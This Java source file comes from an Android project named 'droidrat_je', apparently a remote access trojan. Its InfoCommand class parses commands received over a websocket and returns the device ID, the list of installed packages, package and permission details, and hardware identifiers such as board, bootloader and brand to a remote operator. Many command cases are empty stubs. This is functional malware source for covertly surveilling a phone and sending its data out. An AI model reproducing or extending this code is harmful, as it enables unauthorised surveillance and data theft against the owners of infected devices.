package com.je_chen.droidrat_je.command;

import android.content.Context;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.util.Log;

import com.je_chen.droidrat_je.command.process_super.CommandFather;
import com.je_chen.droidrat_je.modules.appsinfo.getinfo.GetPackagesInfo;
import com.je_chen.droidrat_je.modules.appsinfo.getinfo.GetPhoneInfo;

import java.util.List;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websocket;


public class InfoCommand extends CommandFather{

    private final String TAG = "Info Event ";

    private GetPackagesInfo getPackagesInfo;

    private GetPhoneInfo getPhoneInfo;

    public InfoCommand(PackageManager packageManager, Context context) {
        getPackagesInfo = new GetPackagesInfo(packageManager, context);
        getPhoneInfo = new GetPhoneInfo();
    }

    @Override
    public void send(String value) {
        websocket.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {
                // Package Info

                case "ResolveInfo":
                    Log.d(TAG, "ResolveInfo");
                    List<ResolveInfo> resolveInfoList = getPackagesInfo.getResolveInfo();
                    for(int count = 0;count<resolveInfoList.size();count++)
                        this.send("ResolveInfo: " + resolveInfoList.get(count));
                    break;

                case "InstalledPackages":
                    Log.d(TAG, "InstalledPackages");
                    for(String appName:getPackagesInfo.getInstalledPackages())
                        this.send("InstalledPackages: " + appName);
                    break;

                case "AnotherPermission":
                    String anotherPermissionPermissionName = rawCommandArray[2];
                    String anotherPermissionPackageName = rawCommandArray[3];
                    Log.d(TAG, "AnotherPermission " + "anotherPermissionPermissionName : " + anotherPermissionPermissionName + " anotherPermissionPackageName:" + anotherPermissionPackageName);
                    getPackagesInfo.checkAnotherPermission(anotherPermissionPermissionName, anotherPermissionPackageName);
                    this.send("AnotherPermission " + "anotherPermissionPermissionName : " + anotherPermissionPermissionName + " anotherPermissionPackageName:" + anotherPermissionPackageName);
                    break;

                case "AnotherSignature":
                    String uid1 = rawCommandArray[2];
                    String uid2 = rawCommandArray[3];
                    Log.d(TAG, "AnotherSignature " + "uid1 : " + uid1 + " uid2:" + uid2);
                    getPackagesInfo.checkAnotherSignature(Integer.parseInt(uid1), Integer.parseInt(uid2));
                    this.send("AnotherSignature " + "uid1 : " + uid1 + " uid2:" + uid2);
                    break;

                case "PackageInfo":
                    String packageInfoPackageName = rawCommandArray[2];
                    Log.d(TAG, "PackageInfo " + "packageInfoPackageName : " + packageInfoPackageName);
                    getPackagesInfo.getPackageInfo(packageInfoPackageName);
                    this.send("PackageInfo " + "packageInfoPackageName : " + packageInfoPackageName);
                    break;

                case "ApplicationIcon":
                    String applicationIconPackageName = rawCommandArray[2];
                    Log.d(TAG, "ApplicationIcon " + "applicationIconPackageName : " + applicationIconPackageName);
                    getPackagesInfo.getApplicationIcon(applicationIconPackageName);
                    this.send("ApplicationIcon " + "applicationIconPackageName : " + applicationIconPackageName);
                    break;

                case "ApplicationInfo":
                    String applicationInfoPackageName = rawCommandArray[2];
                    String applicationInfoFlag = rawCommandArray[3];
                    Log.d(TAG, "ApplicationInfo " + "applicationInfoPackageName : " + applicationInfoPackageName + " applicationInfoFlag: " + applicationInfoFlag);
                    getPackagesInfo.getApplicationInfo(applicationInfoPackageName, Integer.parseInt(applicationInfoFlag));
                    this.send("ApplicationInfo " + "applicationInfoPackageName : " + applicationInfoPackageName + " applicationInfoFlag: " + applicationInfoFlag);
                    break;

                case "DeviceId":
                    Log.d(TAG, "DeviceId");
                    this.send("DeviceId :" + getPackagesInfo.getDeviceId());
                    break;

                // Phone Info

                case "BOARD":
                    Log.d(TAG, "BOARD");
                    this.send("BOARD :" + getPhoneInfo.getBOARD());
                    break;

                case "BOOTLOADER":
                    Log.d(TAG, "BOOTLOADER");
                    this.send("BOOTLOADER :" +getPhoneInfo.getBOOTLOADER());
                    break;

                case "BRAND":
                    Log.d(TAG, "BRAND");
                    this.send("BRAND :" +getPhoneInfo.getBRAND());
                    break;

                case "Device":
                    Log.d(TAG, "Device");
                    this.send("Device :" +getPhoneInfo.getDevice());
                    break;

                case "Display":
                    break;

                case "FINGERPRINT":
                    break;

                case "HARDWARE":
                    break;

                case "HOST":
                    break;

                case "ID":
                    break;

                case "MANUFACTURER":
                    break;

                case "Model":
                    break;

                case "Product":
                    break;

                case "TYPE":
                    break;

                case "USER":
                    break;

                case "VERSION_INCREMENTAL":
                    break;

                case "VERSION_RELEASE":
                    break;

                case "Time":
                    break;

                case "SDKVersion":
                    break;

                case "SecurityVersion":
                    break;

                case "CPUInfo":
                    break;

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
